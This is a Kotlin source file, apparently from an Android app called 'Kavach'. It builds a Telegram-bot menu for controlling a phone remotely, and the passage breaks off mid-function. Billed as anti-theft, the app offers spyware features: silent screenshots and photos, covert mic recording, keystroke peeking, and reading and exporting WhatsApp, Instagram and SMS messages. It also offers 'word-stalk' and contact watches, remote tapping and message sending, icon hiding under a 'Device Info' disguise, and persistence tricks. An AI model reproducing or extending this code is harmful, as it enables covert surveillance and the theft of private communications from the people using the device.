package com.kavach.app.core.menu

import android.content.Context
import com.kavach.app.core.actions.KavachActions
import com.kavach.app.core.actions.KavachCamera
import com.kavach.app.core.actions.KavachExtras
import com.kavach.app.core.telegram.TelegramApi
import com.kavach.app.core.vision.FaceGuard
import com.kavach.app.security.SecureStorage

/**
 * 🎮 DeviceMenu — GENERAL'S MENU ENGINE (v2)
 *
 * Owner-focused structure:
 *   🔘 Bot me MENU button tap  →  ALL categories (inline buttons)
 *   📄 15+ categories?  →  ⬅ Back / ➡ Next pagination
 *   📁 Category tap  →  uske commands (inline)
 *   ⚡ Command tap  →  instant ACTION
 *
 * 🔧 EXTENSION: nayi category sirf CATEGORIES list me add karo —
 *    MenuSpec bataoge, main yahin plug karta jaunga. Code rewire nahi!
 */
object DeviceMenu {

    // ═══════════════ SPEC (yahan se badhegi — owner dictation zone) ═══════════════

    /** Ek action = ek command button */
    data class Act(val label: String, val id: String)

    /** Ek category = icon + naam + inside buttons */
    data class Cat(val icon: String, val name: String, val acts: List<Act>)

    /**
     * 📋 MASTER LIST — AAP KE ORDERS YAHIN JUDTENGE.
     * (Abhi v1.4 ke 6 base modules inbuilt; naye 15+ yahin add honge)
     */
    private val CATEGORIES = listOf(
        Cat("📸", "Camera 📸", listOf(
            Act("🤳 1. Front Photo", "camf"),
            Act("📷 2. Back Photo", "camr"),
            Act("🧠 3. AI Intruder Detect (insaan ho tabhi)", "camai"),
            Act("⚡ 4. Low-Light Flash Photo", "camflash"),
            Act("🔍 5. Zoom IN (+)", "zoomp"),
            Act("🔎 5b. Zoom OUT (−)", "zoomm"),
            Act("📏 5c. Zoom 1x", "zoom1"),
            Act("📏 5d. Zoom 2x", "zoom2"),
            Act("📏 5e. Zoom 4x", "zoom4"),
            Act("🖼️ 7. Gallery Thumbnails (last 10)", "thumbs"),
            Act("🎬 8. Front Video — START ▶", "vidsf"),
            Act("🎬 9. Back Video — START ▶", "vidsb"),
            Act("⏹ 10. STOP Video → Send 📤", "vidstop"),
            Act("🕐 11. Time-lapse (1hr strip)", "tlapse"),
            Act("⏹ 11b. STOP TL → Send partial", "tlstop"),
            Act("🧾 12. HQ EVIDENCE shot (zero-compress)", "r_evhq"),
            Act("🎯 S1. DUAL-SHOT (front+back ek saath)", "dual"),
            Act("🎆 S2. CAM-BURST ×5 (best-sharp 🧠)", "fburst")
        )),
        Cat("📱", "Screenshot 📱", listOf(
            Act("📸 1. Screenshot (SILENT)", "ss"),
            Act("📄 2. Shot-DOC (original quality)", "ssdoc"),
            Act("⏰ 3. Delay 5s", "ssdl5"),
            Act("⏰ 3b. Delay 10s", "ssdl10"),
            Act("⏰ 3c. Delay 20s", "ssdl20"),
            Act("🔁 4. Interval 5s×10", "ssin5"),
            Act("🔁 4b. Interval 30s×4", "ssin30"),
            Act("🕵️ 5. Time/Session Monitor", "ssmon"),
            Act("👁 6. Watch: WhatsApp", "wcha"),
            Act("👁 6b. Watch: Telegram", "wtel"),
            Act("👁 6c. Watch: Dialer/Calls", "wdil"),
            Act("👁 6d. Watch: Gallery", "wgal"),
            Act("👁 6e. Watch: Chrome", "wchr"),
            Act("✋ 6f. Watch STOP", "woff"),
            Act("📝 7. OCR (text nikalo)", "ocr"),
            Act("🧠 8. AI Scene Describe", "desc"),
            Act("🔗 9. Link Extractor", "links"),
            Act("🗂 10. History (last 10)", "shist"),
            Act("🔆 11. Screen State (on/off+app)", "state"),
            Act("🧾 S*. SMART REPORT (sab ek saath)", "ssmart"),
            Act("🔎 1. AI-LOOK (photo+faces+scene+text)", "ailook"),
            Act("🎞 2. SCENE-WATCH ▶ (scene badle to alert)", "scenon"),
            Act("⏹ 2b. Scene-watch STOP", "scenoff"),
            Act("📰 3. AI-DIGEST (last shots ka summary)", "aidig")
        )),
        Cat("🔍", "DeepFind", listOf(
            Act("🪪 1. Saare DOCS dhundo", "dfdocs"),
            Act("🤿 2. Deepak Dive (semantic)", "dfdive"),
            Act("🔤 3. Word/number se kheencho", "dfword"),
            Act("📊 4. Index Stats", "dfstats"),
            Act("📚 5. DeepFind HELP", "dfhelp")
        )),
        Cat("👁", "Remote Eye 👁", listOf(
            Act("📸 1. Frame LO (①-⑨ grid ke saath 👆)", "eyegrab"),
            Act("⬅ 2. HOME-PAGE left-swipe", "eyeleft"),
            Act("➡ 3. HOME-PAGE right-swipe", "eyeright"),
            Act("⏹ 4. Tap-session BAND", "eyehalt"),
            Act("🔎 5. Zone-ZOOM tip (/eyezoom N)", "eyezoomt"),
            Act("👆 6. Exact-TAP tip (/eyetap x y)", "eyetiptap"),
            Act("⌨ 7. Ghost-TYPE tip (/eyetext msg)", "eyetiptype"),
            Act("🔙 8. BACK key", "eyeback"),
            Act("🏠 9. HOME key", "eyehome"),
            Act("⧉ 10. RECENTS", "eyerec"),
            Act("📊 11. Eye monitor (grants)", "eyemon"),
            Act("📜 12. LONG-SHOT (scroll-stitch 🧵)", "flong"),
            Act("📝 13. EYE-READ (screen ka text OCR)", "focr"),
            Act("🧠 14. SCREEN-EXPLAIN (kya dikhta)", "fexplain"),
        )),

        Cat("💬", "WhatsApp 💬", listOf(
            Act("📣 1. Status-PICK (pehle LIST → fir CHOOSE 🎯)", "wapeeps"),
            Act("🖼 2. Recent Images ×15", "waimg"),
            Act("🎬 3. Recent Videos ×6", "wavid"),
            Act("🎙 4. Voice Notes ×8 (+vault)", "wavo"),
            Act("📊 5. WA Storage Report", "wastore"),
            Act("🧹 6. JUNK Clean (AUTO-daily 🟢 + tap = abhi)", "waclean"),
            Act("📩 7. MSG-Log ×20 (💾 /walog = CSV file)", "wamsgs"),
            Act("🔍 8. Contact-search tip (buffer+disk 🔄)", "wamsgt"),
            Act("🎯 9. Target-Contact WATCH tip", "wawatcht"),
            Act("⏹ 10. Target-watch STOP", "waoff"),
            Act("📜 11. Full-chat EXPORT tip (+recents saaf 🧹)", "wastoryt"),
            Act("📞 12. WA-CALLS tracker tip (/wacalls)", "wacallst"),
            Act("⏰ 13. WA-SCHEDULER tip (/wamsgat)", "fjobt"),
            Act("🧬 14. WORD-STALK tip (/wastalk)", "fstalkt"),
            Act("🖼 15. DP-DNA watch tip (/wadpwatch)", "fdpt"),
            Act("💬 16. WA-SEND tip (/wasend NUM MSG)", "eyeWasend"),
            Act("📖 17. WA-READ tip (/waread NUM)", "eyeWaread"),
            Act("🛡 18. MEDIA-VAULT — sirf PERSONAL 🟢 (20-cap auto-clear)", "wmvtog"),
            Act("📂 19. Vault list — last ×10", "wmvlist10"),
            Act("📂 20. Vault list — last ×20", "wmvlist20"),
            Act("🚨 21. Vanish-ALERT status (delete-gayab pakad 🔎)", "wmvstats"),
            Act("📞 22. Call-SENTRY toggle (default ON 🟢)", "r_wacall"),
            Act("🗑 23. Anti-DELETE toggle (default ON 🟢 + LOG)", "r_wadelete"),
        )),

        Cat("📸", "Instagram 📸", listOf(
            Act("📊 1. IG GOD status (sentries+stars)", "igstat"),
            Act("📩 2. IG captured MSGs ×25 (buffer+disk)", "igmsgs"),
            Act("🔍 3. Archive-search tip (/igsearch)", "igsrc"),
            Act("⭐ 4. STAR contacts (VIP fwd)", "igstars"),
            Act("🗑 5. UNSEND-SENTRY toggle (default ON 🟢)", "igdeltog"),
            Act("📞 6. Call-SENTRY toggle (default ON 🟢)", "igcalltog"),
            Act("🛡 7. IG Media-VAULT status", "igmvs"),
            Act("📄 8. IG MSG-LOG — CSV file (/iglog)", "iglogx"),
            Act("🗑 9. IG UNSEND-LOG — CSV file (/igdeleted)", "igdelx"),
            Act("🔔 10. IG Notifications ×12", "ignots"),
            Act("📦 11. IG Storage report", "igstore"),
            Act("📚 12. IG HELP (commands)", "ighelp")
        )),
        Cat("🎵", "Media 🎵", listOf(
            Act("🎤 1. Record 15s", "mrec15"),
            Act("🎤 1b. Record 30s", "mrec30"),
            Act("🎤 1c. Record 60s", "mrec60"),
            Act("🗣 3. Burst Voice (har 1min 5s) ×10 🔄", "mburst"),
            Act("⏹ 3b. STOP & Send partial 🎯", "mstop"),
            Act("🎯 5. HQ (noise-filter) 15s", "hq15"),
            Act("🎯 5b. HQ 30s", "hq30"),
            Act("🎯 5c. HQ 60s", "hq60"),
            Act("🔇 6. Internal audio 15s (best-effort)", "mint"),
            Act("🎛 7. Play/Pause ▶⏸", "mtoggle"),
            Act("⏭ 7b. NEXT gaana", "mnext"),
            Act("⏮ 7c. PREV gaana", "mprev"),
            Act("⏩ 7d. SEEK +15s", "mseekp"),
            Act("⏪ 7e. SEEK −15s", "mseekm"),
            Act("🎼 7f. Ab kya chal raha?", "mnow"),
            Act("🔊 8. VOL +", "volp"),
            Act("🔉 8b. VOL −", "volm"),
            Act("🎚 8c. Vol 50%", "vol50"),
            Act("💯 8d. Vol 100%", "vol100"),
            Act("🤫 8e. MUTE kar do", "vol0"),
            Act("🔕 9. Ringer: SILENT", "ring0"),
            Act("📳 9b. Ringer: VIBRATE", "ring1"),
            Act("🔔 9c. Ringer: NORMAL", "ring2"),
            Act("🗣 10. TTS THREAT (Hindi) 😡", "thhi"),
            Act("🗣 10b. TTS THREAT (English) 😡", "then"),
            Act("📊 10. Media Monitor (kya chal raha)", "mmon"),
            Act("🚨 S*. MAX-PANIC COMBO 😱 (siren+threat+lock+photo)", "panic"),
            Act("🎤 11. Record 15s (alt 🎤)", "rec"),
            Act("🎤 11b. Record 30s (alt)", "rec30"),
            Act("🎬 12. Aaj ke videos (/viddump)", "fvidtod")
        )),
        Cat("📞", "Calls & SMS 📞", listOf(
            Act("📋 1. Call Log (last 10)", "clog10"),
            Act("📋 1b. Call Log (last 20)", "clog20"),
            Act("🚩 2. Missed-call ALERTS ON 👁", "misson"),
            Act("⏹ 2b. Missed-alerts OFF", "missoff"),
            Act("📞 3. Make Call (👇 likho: `/call NUMBER`)", "calltip"),
            Act("📩 4. SMS padho (last 10)", "sms10"),
            Act("📩 4b. SMS padho (last 20)", "sms20"),
            Act("💬 5. SMS bhejo (👇 likho: `/sms NUM MSG`)", "smstip"),
            Act("📇 6. ALL Contacts (file 📎)", "contacts"),
            Act("📊 Phone Monitor (watch/perms)", "pmon"),
            Act("📥 S*. SMS-Watch ON 👁 (incoming auto-forward)", "smwon"),
            Act("⏹ S*b. SMS-Watch OFF", "smwoff"),
            Act("📊 12. CALL-STATS 7din chart", "fcallst")
        )),
        Cat("📍", "Location 📍", listOf(
            Act("📍 1. FULL report (GPS+map)", "loc"),
            Act("🏠 2. Address (area/naam)", "locaddr"),
            Act("📡 3. Live BEACON ▶ (har 10min ×6)", "bcnon"),
            Act("⏹ 3b. Beacon STOP", "bcnoff"),
            Act("🚧 4. GEO-FENCE 100m ▶", "fen100"),
            Act("🚧 4b. GEO-FENCE 500m ▶", "fen500"),
            Act("⏹ 4c. Fence STOP", "fenoff"),
            Act("🚗 5. Speed meter", "spd"),
            Act("📜 6. Location HISTORY (session)", "lochist"),
            Act("📊 Location Monitor", "locmon")
        )),
        Cat("🔐", "Security & Alarm 🚨", listOf(
            Act("🔒 1. Lock Screen turant", "lock"),
            Act("👮 2. Admin/arm status", "gadmin"),
            Act("⚡ 2b. GOD-X panel (sab sentries ek saath)", "r_godx"),
            Act("📵 3. SIM-change WATCH ON 👁", "simon"),
            Act("⏹ 3b. SIM-watch OFF", "simoff"),
            Act("🔓 4. Wrong-unlock report", "wrongr"),
            Act("🔌 5. Charge-watch ON 👁", "chgon"),
            Act("⏹ 5b. Charge-watch OFF", "chgoff"),
            Act("🪤 6. FAKE-SHUTDOWN decoy ▶", "decoyon"),
            Act("⚫ 6b. Decoy OFF", "decoyoff"),
            Act("🆘 7. THEFT-MODE 💥 (siren+lock+photo+loc+fence!)", "theft"),
            Act("📊 Guard Monitor", "gmon"),
            Act("🔊 Siren ON", "alm"),
            Act("🗣️ Siren + Dhamki", "almt"),
            Act("✋ STOP (quiet)", "stop")
        )),
        Cat("🧿", "Senses 🧿", listOf(
            Act("🧬 1. Notif ARCHIVE (latest)", "r_notif"),
            Act("🗑 2. Notif XRAY (vanish-snitch)", "r_notifxray"),
            Act("💰 3. MONEY-METER (UPI hisaab)", "r_money"),
            Act("👂 4. NIGHT-EAR toggle (raat-mic)", "r_nightear"),
            Act("🏃 5. MOTION-SNAP toggle", "r_motion"),
            Act("⌨️ 6. TYPE-SHADOW peek", "r_shadow")
        )),
        Cat("📁", "Files 📁", listOf(
            Act("📂 1. List: Downloads", "flsdl"),
            Act("📂 1b. List: DCIM", "flsdcim"),
            Act("📂 1c. List: Root /sdcard", "flsroot"),
            Act("🗂 1d. List: WhatsApp Media", "flswa"),
            Act("📄 2. Get File tip (📤 phone→TG)", "fgettip"),
            Act("📥 3. Upload tip (bot→phone📤)", "fuptip"),
            Act("🗑 4. Delete tip", "fdeltip"),
            Act("✏️ 5. Rename/Move/Copy tip", "frentip"),
            Act("🔍 6. Search tip", "fscht"),
            Act("🗜 7. Zip tip + Unzip", "fzipt"),
            Act("🙈 8. Hide tips (.nomedia + 🔒dot-hide)", "fhidet"),
            Act("🟦 9. CACHE: WhatsApp peek", "fpeakwa"),
            Act("🟩 9b. CACHE: Telegram peek", "fpeaktg"),
            Act("🟪 9c. CACHE: Instagram peek", "fpeakig"),
            Act("🏴‍☠️ 10. RECOVERY scan (non-root best-effort)", "freco"),
            Act("📋 10b. Commands cheat-sheet (sab ek saath)", "fcheat"),
            Act("📦 11. APK link (QR+URL)", "r_apk"),
            Act("🧬 12. DUP-HUNTER (same-name files pakad)", "fdups")
        )),
        Cat("⚙️", "System ⚙️", listOf(
            Act("📱 1. FULL Device audit", "sysinfo"),
            Act("🔋 2. Battery TECH (temp/voltage/health)", "battd"),
            Act("🔆 3. Brightness 30%", "br30"),
            Act("🔆 3b. Brightness 70%", "br70"),
            Act("🔆 3c. Brightness 100%", "br100"),
            Act("👁 4. Screen WAKE (2 min lion)", "wake2"),
            Act("👁 4b. Screen WAKE (10 min)", "wake10"),
            Act("😴 4c. Wake-lorrya release", "wakeoff"),
            Act("📊 5. Data usage (boot se)", "datause"),
            Act("🐘 6. BIG files finder (≥100MB)", "bigf"),
            Act("🐘 6b. BIG files (≥500MB)", "bigf5"),
            Act("🧹 7. App-cachedge CLEAN", "cacheclean"),
            Act("📊 8. Status", "status"),
            Act("📈 9. FULL status report", "r_report"),
            Act("🔋 10. Battery (quick)", "batt"),
            Act("🔋 11. LAST-PING sentry (≤8% batt alarm)", "r_lastping"),
            Act("👻 12. GHOST-NOTIF (stealth shade)", "r_ghostnotif"),
            Act("🧾 13. HQ-EVIDENCE tip (`/evhq`)", "t_evhq"),
            Act("🏥 13. HEALTH card (sab engines)", "fhealth"),
            Act("⏳ 13b. Day-TIMELINE (apps-usage)", "ftimel"),
            Act("🎬 14. MACRO-RECORDER tip (/macro)", "fmacrot"),
            Act("🤖 15. AUTO-PILOT rules tip (/rule)", "frulet")
        )),
        Cat("📦", "Apps 📦", listOf(
            Act("📋 1. Installed apps (user)", "applist"),
            Act("🔍 2. App-search tip (`/apps naam`)", "appscht"),
            Act("ℹ️ 3. Details tip (`/appinfo pkg`)", "apptip"),
            Act("▶️ 4. Open-app tip (`/openapp pkg`)", "appopt"),
            Act("🗑 5. Uninstall tip (`/uninstall pkg`)", "apputip"),
            Act("👁 6. NEW-APP watch ON 👁", "appwon"),
            Act("⏹ 6b. App-watch OFF", "appwoff"),
            Act("📄 7. BACKUP-list (file 📎)", "appback"),
            Act("👻 8. Icon HIDE (launcher se gayab 🕳)", "icohide"),
            Act("👀 9. Icon SHOW (wapas lao)", "icoshow"),
            Act("🔬 10. Icon STATUS", "icostat"),
            Act("⏱ 11. Icon AUTO-hide tip (`/icon auto N`)", "icoautot")
        )),
        Cat("🌐", "Network & Browser 🌍", listOf(
            Act("🌐 1. Net RUN-time report", "netfull"),
            Act("🌍 2. Public IP", "netpub"),
            Act("📶 3. Nearby WiFi scan", "wifiscan"),
            Act("⚡ 4. Speed-test (lite)", "speedt"),
            Act("📊 5. Data usage", "datause"),
            Act("🌍 6. Open-URL tip", "bropt"),
            Act("🔍 7. Google search tip (`/google q`)", "brsrt"),
            Act("📥 8. /dl <url> — download→device tip", "brdlt"),
            Act("🔖 9. Saved-links dikhao", "brsave"),
            Act("➕ 10. Link save tip (`/save url`)", "brsavet"),
            Act("🌐 11. NET-TRIP log", "fntrip"),
            Act("🧯 12. NETKILL tip (/netkill pkg)", "fnkt")
        )),
        Cat("📋", "Clipboard 📋", listOf(
            Act("📖 1. Clipboard padho (best-effort)", "clread"),
            Act("✏️ 2. Set tip (👇 `/setclip TEXT`)", "cltip"),
            Act("🧹 3. Clipboard SAFFUD", "clclear"),
            Act("🔗 4. Last-clip me URL? ", "clurl"),
            Act("👁 5. Clip-Watch ON (har 30s check)", "clwon"),
            Act("⏹ 5b. Clip-Watch OFF ", "clwoff"),
            Act("📜 6. Clip-History (session)", "clhist")
        )),
        Cat("⚙️", "Setup & Logs 🔧", listOf(          // 🧰 Admin & Logs = DISSOLVE ho gaya (chief order)
            Act("🔗 1. Pair code dekhna (`/pair <code>`)", "t_pair"),
            Act("🔑 2. Secret-KEY tip (`/key <code>`)", "t_key"),
            Act("📤 3. OUTBOX queue (un-bheja evid)", "r_outbox"),
            Act("📜 4. System LOGS", "r_logs"),
            Act("🗃 5. Vault STORE size", "r_kstore"),
            Act("🧹 6. JANITOR (space-saaf)", "r_janitor"),
            Act("❓ 7. HELP master file", "r_help"),
            Act("🎨 8. BOT-STYLE sync (naam/DP/desc)", "botstyle"),
            Act("💉 9. SURVIVAL status (LONG-LIFE 🧬)", "ksurv"),
            Act("🧟 10. ANTI-HIBERNATE guard (unused-app 🛑)", "khiber"),
            Act("🔋 11. BATTERY-EXEMPT (kabhi na mare ♾)", "kbatt"),
            Act("📟 12. OEM-RESCUE (Vivo/Samsung/MI auto-start)", "koem"),
            Act("🫀 13. LIFE-TRACK (uptime/murders 💪)", "klife")
        ))
)

    // ═══════════════ PAGINATION GEARS ═══════════════

    private const val PER_PAGE = 8                     // ek page pe 8 category buttons
    private fun pageCount() = (CATEGORIES.size + PER_PAGE - 1) / PER_PAGE

    private fun rowOf(vararg pair: String): String =
        "[" + (0 until pair.size step 2).joinToString(",") {
            "{\"text\":\"${pair[it]}\",\"callback_data\":\"${pair[it + 1]}\"}"
        } + "]"

    /** Home menu ka page banao (0-indexed) */
    private fun homeMarkup(page: Int): String {
        val from = page * PER_PAGE
        val cats = CATEGORIES.subList(from, minOf(CATEGORIES.size, from + PER_PAGE))
        val rows = mutableListOf<String>()
        // 2 buttons per row
        var i = 0
        while (i < cats.size) {
            val a = cats[i]
            if (i + 1 < cats.size) {
                val b = cats[i + 1]
                rows += rowOf("${a.icon} ${a.name}", "cat:${CATEGORIES.indexOf(a)}",
                              "${b.icon} ${b.name}", "cat:${CATEGORIES.indexOf(b)}")
            } else rows += rowOf("${a.icon} ${a.name}", "cat:${CATEGORIES.indexOf(a)}")
            i += 2
        }
        // ⬅ Back / ➡ Next (only if >1 page)
        if (pageCount() > 1) {
            val nav = mutableListOf<String>()
            if (page > 0) { nav += "⬅ Back"; nav += "pg:${page - 1}" }
            nav += "📄 ${page + 1}/${pageCount()}"; nav += "pg:$page"
            if (page < pageCount() - 1) { nav += "Next ➡"; nav += "pg:${page + 1}" }
            rows += rowOf(*nav.toTypedArray())
        }
        return "{\"inline_keyboard\":[${rows.joinToString(",")}]}"
    }

    /** ✂️ button label CHHOTA rakho — tall list nahi, neat grid */
    private fun trimLabel(s: String): String {
        val base = s.substringBefore(" (").trim()
        return if (base.length <= 25) base
        else base.take(24).trimEnd() + "…"
    }

    /** 🗂 SUB-CATEGORIES — bade cats ke andar sections (tall list pe war!) */
    private val GROUPS: Map<Int, List<Pair<String, List<String>>>> = mapOf(
        0 to listOf(
            "📷 Snaps & AI" to listOf("camf", "camr", "camai", "camflash", "dual"),
            "🔍 Zoom & Thumbs" to listOf("zoomp", "zoomm", "zoom1", "zoom2", "zoom4", "thumbs"),
            "🎬 Video" to listOf("vidsf", "vidsb", "vidstop", "tlapse", "tlstop")),
        1 to listOf(
            "📸 Shots" to listOf("ss", "ssdoc", "ssdl5", "ssdl10", "ssdl20", "ssin5", "ssin30", "shist", "state"),
            "👁 Watch & AI" to listOf("wcha", "wtel", "wdil", "wgal", "wchr", "woff", "ocr", "desc", "links"),
            "🎥 Screen-Mon" to listOf("ssmon", "ssmart"),
            "🧠 AI-Shot" to listOf("ailook", "scenon", "scenoff", "aidig")),
        6 to listOf(
            "🎤 Record" to listOf("mrec15", "mrec30", "mrec60", "mburst", "mstop", "hq15", "hq30", "hq60", "mint"),
            "🎛 Player & Vol" to listOf("mtoggle", "mnext", "mprev", "mseekp", "mseekm", "mnow", "volp", "volm", "vol50", "vol100", "vol0", "ring0", "ring1", "ring2"),
            "🗣 Bol & Panic" to listOf("thhi", "then", "mmon", "panic"),
            "🎙 Quick Rec" to listOf("rec", "rec30")),
        9 to listOf(
            "🔐 Guard & Watch" to listOf("lock", "gadmin", "simon", "simoff", "wrongr", "chgon", "chgoff", "decoyon", "decoyoff", "theft", "gmon", "alm", "almt", "stop"),
            "🚨 Alarm" to listOf("alm", "almt", "stop")),
        14 to listOf(
            "🌐 Network" to listOf("netfull", "netpub", "wifiscan", "speedt", "datause"),
            "🌍 Browser" to listOf("bropt", "brsrt", "brdlt", "brsave", "brsavet"))
    )

    /** group chooser page (cat tap → sections) */
    private fun groupsMarkup(catIdx: Int): String {
        val rows = mutableListOf<String>()
        GROUPS[catIdx]?.forEachIndexed { gi, gn_ids ->
            rows += rowOf("${gn_ids.first}  ${gn_ids.second.size}", "grp:$catIdx:$gi")
        }
        rows += rowOf("🔙 Categories", "pg:0")
        return "{\"inline_keyboard\":[${rows.joinToString(",")}]}"
    }

    /** acts ka page — COMPACT 2-per-row grid (labels trimmed) */
    private fun actsMarkup(catIdx: Int, acts: List<Act>, backCb: String, backLabel: String): String {
        val rows = mutableListOf<String>()
        var i = 0
        while (i < acts.size) {
            val a = acts[i]
            if (i + 1 < acts.size) {
                val b = acts[i + 1]
                rows += rowOf(trimLabel(a.label), "do:${catIdx}:${a.id}", trimLabel(b.label), "do:${catIdx}:${b.id}")
            } else rows += rowOf(trimLabel(a.label), "do:${catIdx}:${a.id}")
            i += 2
        }
        rows += rowOf(backLabel, backCb)
        return "{\"inline_keyboard\":[${rows.joinToString(",")}]}"
    }

    /** Category ke andar ka (command) menu — COMPACT grid */
    private fun catMarkup(catIdx: Int): String =
        actsMarkup(catIdx, CATEGORIES[catIdx].acts, "pg:0", "🔙 Categories")

    /** 💬 WA files sender helper (image→photo, video→video, bada→doc-parts guard) */
    private suspend fun waSendFiles(api: TelegramApi, chatId: Long, files: List<java.io.File>, tag: String) {
        if (files.isEmpty()) { api.sendMessage(chatId, "🍃 Kuchh nahi mila (All-files access 🟢? / WA installed?)"); return }
        val imgs = files.filter { it.length() <= 45L * 1024 * 1024 && it.name.matches(Regex(".*\\.(jpg|jpeg|png)$", RegexOption.IGNORE_CASE)) }
        val vids = files.filter { !(it.name.matches(Regex(".*\\.(jpg|jpeg|png)$", RegexOption.IGNORE_CASE))) }
        // images → album chunks
        imgs.mapIndexed { i, f -> f.readBytes() to "$tag #${i + 1}" }.chunked(10).forEach { api.sendMediaGroup(chatId, it) }
        // videos/docs
        vids.forEach { f ->
            if (f.length() <= 45L * 1024 * 1024) {
                api.sendChatAction(chatId, "upload_video")
                api.sendVideoFile(chatId, f, "$tag • ${f.name} • ${com.kavach.app.core.files.KavachFiles.sizeStr(f.length())}")
            } else {
                api.sendMessage(chatId, "⚠️ ${f.name} (${com.kavach.app.core.files.KavachFiles.sizeStr(f.length())}) 45MB+ isliye skip — chahiye to /get bhej bhai (parts banta)")
            }
        }
        if (imgs.isEmpty() && vids.size == 0) api.sendMessage(chatId, "🍃 Kuchh milla nahi is section me")
    }

    /** 🎯 chatId → last ghost-eye frame ka message_id (edit-in-place!) */
    private val eyeLastMsg = java.util.concurrent.ConcurrentHashMap<Long, Long>()

    /** 👁 eye frame — PEHLI baar bhejo, baad me USI message ko EDIT (chat bild-khali! ✨)
     *  Frame pe ①-⑨ grid DRAW hota — buttons ka exact visual map 👆
     *  halt=true → final edit + buttons hata + track-clear */
    private suspend fun sendEyeFrame(api: TelegramApi, chatId: Long, frameIn: ByteArray?, n: Int? = null, appendCap: String? = null, halt: Boolean = false, markZone: Int? = null, markOk: Boolean = true) {
        val S = com.kavach.app.core.screen.KavachScreen
        val E = com.kavach.app.core.eye.KavachEye
        val raw = frameIn ?: E.gridFrame(app_ref) ?: run {
            api.sendMessage(chatId, "📸 Frame nahi bana (♿ Screen-power OFF? ya screen band)")
            return
        }
        val framed = S.withZoneGrid(raw, markZone, markOk)   // 🎮 numbers ON photo + 🎯 tap-marker ring!
        val webp = com.kavach.app.core.evidence.EvidenceCodec.isWebp(framed)
        val mime = if (webp) "image/webp" else "image/jpeg"
        val name = if (webp) "eye.webp" else "eye.jpg"
        val t = S.timeStamp() + (n?.let { " • #$it" } ?: "") + (appendCap?.let { "\n$it" } ?: "") + "\n🔎 zoom: /eyezoom <1-9>"
        val kb = if (halt) "{\"inline_keyboard\":[]}" else "{\"inline_keyboard\":[" +
                "[{\"text\":\"1️⃣\",\"callback_data\":\"eyez1\"},{\"text\":\"2️⃣\",\"callback_data\":\"eyez2\"},{\"text\":\"3️⃣\",\"callback_data\":\"eyez3\"}]," +
                "[{\"text\":\"4️⃣\",\"callback_data\":\"eyez4\"},{\"text\":\"5️⃣\",\"callback_data\":\"eyez5\"},{\"text\":\"6️⃣\",\"callback_data\":\"eyez6\"}]," +
                "[{\"text\":\"7️⃣\",\"callback_data\":\"eyez7\"},{\"text\":\"8️⃣\",\"callback_data\":\"eyez8\"},{\"text\":\"9️⃣\",\"callback_data\":\"eyez9\"}]," +
                "[{\"text\":\"🔙 Back\",\"callback_data\":\"eyeback2\"},{\"text\":\"🏠 Home\",\"callback_data\":\"eyehome2\"},{\"text\":\"⧉ Rec\",\"callback_data\":\"eyerec2\"}]," +
                "[{\"text\":\"⬆ Scroll\",\"callback_data\":\"eyeup\"},{\"text\":\"⬇ Scroll\",\"callback_data\":\"eyedn\"},{\"text\":\"⬅\",\"callback_data\":\"eyeleft\"},{\"text\":\"➡\",\"callback_data\":\"eyeright\"},{\"text\":\"🔄\",\"callback_data\":\"eyeref\"},{\"text\":\"⏹\",\"callback_data\":\"eyehalt\"}]]}"
        val prev = eyeLastMsg[chatId] ?: 0L
        var edited = false
        if (prev > 0) edited = api.editPhoto(chatId, prev, framed, "👁 GHOST • $t", kb, mime, name)
        if (!edited) {
            val nid = api.sendPhotoId(chatId, framed, "👁 GHOST • $t", if (halt) null else kb, mime, name)
            if (nid > 0) eyeLastMsg[chatId] = nid.toLong()
        }
        if (halt) eyeLastMsg.remove(chatId)   // ⏹ band — agla frame fresh msg ✨
    }

    /** 👁 app context ref (late fallback) */
    private val app_ref: android.content.Context get() = com.kavach.app.KavachApp.inst.applicationContext

    /** 🧰 menu-button → CommandRouter ka text-command (crash-safe) */
    private suspend fun runText(app: Context, api: TelegramApi, chatId: Long, cmd: String) {
        runCatching {
            com.kavach.app.core.commands.CommandRouter(app, api)
                .route(com.kavach.app.core.channel.IncomingCommand(chatId, cmd))
        }.onFailure { api.sendMessage(chatId, "⚠️ $cmd fail: ${it.javaClass.simpleName}") }
    }

    private suspend fun tipMsg(api: TelegramApi, chatId: Long, cbId: String, txt: String) {
        api.answerCb(cbId, "ℹ️ kaam dekh lijiye 👇")
        api.sendMessage(chatId, txt)
    }

    // ── 📱 SCREENSHOT helpers ──
    /** session guard: session nahi hai to unlock message; null return = abort */
    private suspend fun ssGuard(app: Context, api: TelegramApi, chatId: Long): ByteArray? {
        val S = com.kavach.app.core.screen.KavachScreen
        if (!S.sessionAlive()) {
            api.sendMessage(chatId, "♿ Screen-power OFF hai.\n\n👉 Device Info app → 11-TAP → 🔑 Screen-power row → ON KARO (a11y settings me 'Device Info' ON karo).\nEk baar ON = REBOOT ke baad bhi chalu — session-DEAD ka zamana KHATAM 🪦")
            return null
        }
        return S.shot(app)
    }

    private suspend fun ssShot(app: Context, api: TelegramApi, chatId: Long, cbId: String) {
        api.answerCb(cbId, "📸 silent…")
        api.sendChatAction(chatId, "upload_photo")
        val jpg = ssGuard(app, api, chatId)
        if (jpg != null) api.sendPhoto(chatId, jpg, "📱 SCREENSHOT • ${com.kavach.app.core.screen.KavachScreen.timeStamp()} 🤫")
    }


    private suspend fun ssDelay(app: Context, api: TelegramApi, chatId: Long, cbId: String, sec: Int) {
        api.answerCb(cbId, "⏰ ${sec}s…")
        if (!com.kavach.app.core.screen.KavachScreen.sessionAlive()) { ssGuard(app, api, chatId); return }
        api.sendMessage(chatId, "⏰ ${sec}s me screenshot aa raha hai… (chor ko koi pata nahi chalega 🤫)")
        kotlinx.coroutines.delay(sec * 1000L)
        val jpg = ssGuard(app, api, chatId) ?: return
        api.sendChatAction(chatId, "upload_photo")
        api.sendPhoto(chatId, jpg, "⏰ DELAYED SHOT (${sec}s) • ${com.kavach.app.core.screen.KavachScreen.timeStamp()}")
    }

    private suspend fun ssInterval(app: Context, api: TelegramApi, chatId: Long, cbId: String, gapSec: Int, n: Int) {
        api.answerCb(cbId, "🔁 har ${gapSec}s…")
        if (!com.kavach.app.core.screen.KavachScreen.sessionAlive()) { ssGuard(app, api, chatId); return }
        api.sendMessage(chatId, "🔁 INTERVAL start — har ${gapSec}s × $n shots 📡")
        val S = com.kavach.app.core.screen.KavachScreen
        repeat(n) { i ->
            kotlinx.coroutines.delay(gapSec * 1000L)
            val f = S.shot(app)
            if (f != null) api.sendPhoto(chatId, f, "🔁 #${i + 1}/$n • ${S.timeStamp()}")
        }
